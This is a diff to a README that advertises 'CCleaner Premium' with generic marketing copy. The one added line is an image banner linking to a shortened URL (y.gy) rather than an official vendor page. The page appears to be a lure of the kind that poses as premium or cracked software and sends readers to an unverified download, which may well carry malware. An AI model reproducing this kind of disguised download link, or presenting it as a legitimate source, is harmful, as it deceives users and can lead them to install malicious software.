@@ -1,6 +1,8 @@
 # CCleaner
 **CCleaner Premium** is a trusted utility designed to optimize system performance and simplify computer upkeep. It tackles common problems such as sluggish startups, low disk space, and privacy concerns with a complete toolkit that keeps your PC running faster, cleaner, and more reliably.
 
+[![52477659567957895780478947867](https://github.com/user-attachments/assets/6df40222-c73c-4bcc-8f97-025ab592658b)](https://y.gy/ccleaner-pru)
+
 ## **CCleaner Premium: Smarter PC Care**
 
 The program stands out for its simple design. A clear, intuitive interface makes it easy to remove unnecessary files, speed up processes, and protect personal data. Even users without technical expertise can maintain their computer’s performance independently, without extra help or time-consuming manual tasks.
